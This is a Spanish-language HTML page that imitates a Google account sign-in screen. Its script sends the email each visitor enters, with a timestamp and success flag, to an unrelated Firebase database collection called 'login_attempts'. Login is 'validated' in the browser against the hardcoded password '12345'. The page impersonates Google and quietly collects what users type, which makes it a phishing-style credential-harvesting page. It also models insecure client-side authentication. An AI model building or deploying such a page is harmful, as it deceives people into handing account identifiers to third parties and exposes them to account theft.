<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .button-group button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button-group button:hover {
            background-color: #357ae8;
        }
        .error-message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>Iniciar sesión</h1>
        <form id="login-form">
            <div class="input-group">
                <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Introduce tu contraseña" required>
            </div>
            <div class="button-group">
                <button type="submit">Iniciar sesión</button>
            </div>
        </form>
        <p id="error-message" class="error-message"></p>
    </div>

    <!-- Import Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
        import { getFirestore, collection, addDoc, Timestamp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-firestore.js";

        // Firebase config
        const firebaseConfig = {
            apiKey: "AIzaSyBEWPP5MEi7TD5VTZkp7my1VztTcSEx-KE",
            authDomain: "login-attempts-9606c.firebaseapp.com",
            projectId: "login-attempts-9606c",
            storageBucket: "login-attempts-9606c.firebasestorage.app",
            messagingSenderId: "663920712947",
            appId: "1:663920712947:web:ad71401e5dc108a5d2eb86"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Function to save login attempt in Firestore
        async function saveLoginAttempt(email, success) {
            try {
                const docRef = await addDoc(collection(db, "login_attempts"), {
                    email: email,
                    success: success,
                    timestamp: Timestamp.fromDate(new Date()) // Current timestamp
                });
                console.log("Login attempt saved with ID: ", docRef.id);
            } catch (e) {
                console.error("Error saving document: ", e);
            }
        }

        // Handle form submission
        const form = document.getElementById("login-form");
        form.addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent page reload

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email && password) {
                // Simulate login validation (use actual validation in production)
                const isLoginSuccessful = password === "12345"; // Example password validation
                
                if (isLoginSuccessful) {
                    saveLoginAttempt(email, true); // Save successful login attempt
                    document.getElementById("error-message").textContent = ""; // Clear error message
                    alert("Inicio de sesión exitoso!");
                } else {
                    saveLoginAttempt(email, false); // Save failed login attempt
                    document.getElementById("error-message").textContent = "Correo o contraseña incorrectos";
                }
            } else {
                document.getElementById("error-message").textContent = "Por favor, completa todos los campos";
            }
        });
    </script>

</body>
</html>
